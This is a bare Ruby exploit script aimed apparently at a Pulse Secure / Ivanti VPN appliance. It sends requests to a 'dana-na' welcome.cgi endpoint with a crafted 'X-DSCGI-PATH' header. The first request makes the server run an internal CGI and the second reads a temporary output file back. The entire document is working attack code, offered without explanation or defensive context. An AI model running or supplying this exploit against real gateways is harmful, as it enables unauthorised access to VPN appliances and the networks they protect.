require 'net/http'
uri = URI(ARGV[0].sub(%r{/$}, '') + '/dana-na/auth/url_default/welcome.cgi')
request = Net::HTTP::Get.new(uri)
request['X-DSCGI-PATH'] = '/home/webserver/htdocs/dana/fb/smb/wu.cgi'
puts Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == 'https') { |http| http.request(request).body }
request = Net::HTTP::Get.new(uri)
request['x-dscgi-path'] = '/home/runtime/tmp/output.txt'
puts Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == 'https') { |http| http.request(request).body }
